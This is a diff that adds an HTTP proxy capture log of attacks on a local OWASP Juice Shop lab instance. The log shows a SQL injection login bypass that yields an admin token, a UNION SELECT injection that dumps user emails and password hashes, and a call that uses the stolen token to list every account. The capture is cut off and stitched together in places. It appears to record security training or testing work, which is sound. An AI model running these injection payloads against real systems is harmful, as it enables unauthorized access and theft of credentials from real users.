@@ -1,0 +1,139 @@
+
+
+[04:51:09.094] reverse proxy to http://host.docker.internal:3000 listening at *:8080.
+[04:51:13.870][192.168.215.1:33724] client connect
+[04:51:13.874][192.168.215.1:33724] server connect host.docker.internal:3000 (0.250.250.254:3000)
+192.168.215.1:33724: POST http://host.docker.internal:3000/rest/user/login
+    Host: host.docker.internal:3000
+    User-Agent: curl/8.7.1
+    Accept: */*
+    Content-Type: application/json
+    Content-Length: 37
+
+    {
+        "email": "' OR 1=1--",
+        "password": "x"
+    }
+
+ << 200 OK 784b
+    Access-Control-Allow-Origin: *
+    X-Content-Type-Options: nosniff
+    X-Frame-Options: SAMEORIGIN
+    Feature-Policy: payment 'self'
+    X-Recruiting: /#/jobs
+    Content-Type: application/json; charset=utf-8
+    Content-Length: 784
+    ETag: W/"310-nkplM5PZUFuG6HIC41c8NkG/rMU"
+    Vary: Accept-Encoding
+    Date: Tue, 27 Oct 2026 04:51:13 GMT
+    Connection: keep-alive
+    Keep-Alive: timeout=5
+
+    {
+        "authentication": {
+            "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAwNDo0MzoyOS45MzEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAwNDo0MzoyOS45MzEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMwNzY2NzR9.fu_Cyfnj7yD1vdV-a8YNVMWbegvbVo7Ai0sL59QqI-YlzQqzANSfbNcHPmM7Ihdfmhcl3ejXUwztaej8eykvn3MeLPW-mgCYtwVL2lTJPnab70YcXPGQgMiKxoZykQwSJb_GOqGnyR0XOYSH7WvTm8QUEALc3onohLgVfImsfvA",
+            "bid": 1,
+            "umail": "admin@juice-sh.op"
+        }
+    }
+
+[04:51:13.906][192.168.215.1:33724] client disconnect
+[04:51:13.906][192.168.215.1:33724] server disconnect host.docker.internal:3000 (0.250.250.254:3000)
+[04:51:13.921][192.168.215.1:33734] client connect
+[04:51:13.923][192.168.215.1:33734] server connect host.docker.internal:3000 (0.250.250.254:3000)====================================================================================================
+[04:51:13.906][192.168.215.1:33724] server disconnect host.docker.internal:3000 (0.250.250.254:3000)
+[04:51:13.921][192.168.215.1:33734] client connect
+[04:51:13.923][192.168.215.1:33734] server connect host.docker.internal:3000 (0.250.250.254:3000)
+192.168.215.1:33734: GET http://host.docker.internal:3000/rest/products/search?q=qwert%27%29%29+UNION+SELECT+id%2cemail%2cpassword%2c1%2c1%2c1%2c1%2c1%2c1%2c1+FROM+Users--
+    Host: host.docker.internal:3000
+    User-Agent: curl/8.7.1
+    Accept: */*
+
+    q: qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FROM Users--
+
+ << 200 OK 4.4k
+    Access-Control-Allow-Origin: *
+    X-Content-Type-Options: nosniff
+    X-Frame-Options: SAMEORIGIN
+    Feature-Policy: payment 'self'
+    X-Recruiting: /#/jobs
+    Content-Type: application/json; charset=utf-8
+    Content-Length: 4462
+    ETag: W/"116e-BXt/NKNwM2rehwfKR65595+BO9w"
+    Vary: Accept-Encoding
+    Date: Tue, 27 Oct 2026 04:51:13 GMT
+    Connection: keep-alive
+    Keep-Alive: timeout=5
+
+    {
+        "status": "success",
+        "data": [
+            {
+                "id": 1,
+                "name": "admin@juice-sh.op",
+                "description": "0192023a7bbd73250516f069df18b500",
+                "price": 1,
+                "deluxePrice": 1,
+                "image": 1,
+                "alternateImages": 1,
+                "createdAt": 1,
+                "updatedAt": 1,
+                "deletedAt": 1
+            },
+            {
+                "id": 2,
+                "name": "jim@juice-sh.op",
+                "description": "e541ca7ecf72b8d1286474fc613e5e45",
+                "price": 1,
+                "deluxePrice": 1,
+                "image": 1,
+                "alternateImages": 1,
+                "createdAt": 1,====================================================================================================
+[04:51:13.937][192.168.215.1:33734] server disconnect host.docker.internal:3000 (0.250.250.254:3000)
+[04:51:13.989][192.168.215.1:33744] client connect
+[04:51:13.991][192.168.215.1:33744] server connect host.docker.internal:3000 (0.250.250.254:3000)
+192.168.215.1:33744: GET http://host.docker.internal:3000/api/Users
+    Host: host.docker.internal:3000
+    User-Agent: curl/8.7.1
+    Accept: */*
+    Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAwNDo0MzoyOS45MzEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAwNDo0MzoyOS45MzEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMwNzY2NzR9.fu_Cyfnj7yD1vdV-a8YNVMWbegvbVo7Ai0sL59QqI-YlzQqzANSfbNcHPmM7Ihdfmhcl3ejXUwztaej8eykvn3MeLPW-mgCYtwVL2lTJPnab70YcXPGQgMiKxoZykQwSJb_GOqGnyR0XOYSH7WvTm8QUEALc3onohLgVfImsfvA
+
+ << 200 OK 6.5k
+    Access-Control-Allow-Origin: *
+    X-Content-Type-Options: nosniff
+    X-Frame-Options: SAMEORIGIN
+    Feature-Policy: payment 'self'
+    X-Recruiting: /#/jobs
+    Content-Type: application/json; charset=utf-8
+    Content-Length: 6619
+    ETag: W/"19db-gZwOlNJB8B4AhUaZjXhKm+nJTIo"
+    Vary: Accept-Encoding
+    Date: Tue, 27 Oct 2026 04:51:14 GMT
+    Connection: keep-alive
+    Keep-Alive: timeout=5
+
+    {
+        "status": "success",
+        "data": [
+            {
+                "id": 1,
+                "username": "",
+                "email": "admin@juice-sh.op",
+                "role": "admin",
+                "deluxeToken": "",
+                "lastLoginIp": "",
+                "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+                "isActive": true,
+                "createdAt": "2026-10-27T04:43:29.931Z",
+                "updatedAt": "2026-10-27T04:43:29.931Z",
+                "deletedAt": null
+            },
+            {
+                "id": 2,
+                "username": "",
+                "email": "jim@juice-sh.op",
+                "role": "customer",
+                "deluxeToken": "",
+                "lastLoginIp": "",
+                "profileImage": "assets/public/images/uploads/default.svg",
+                "isActive": true,
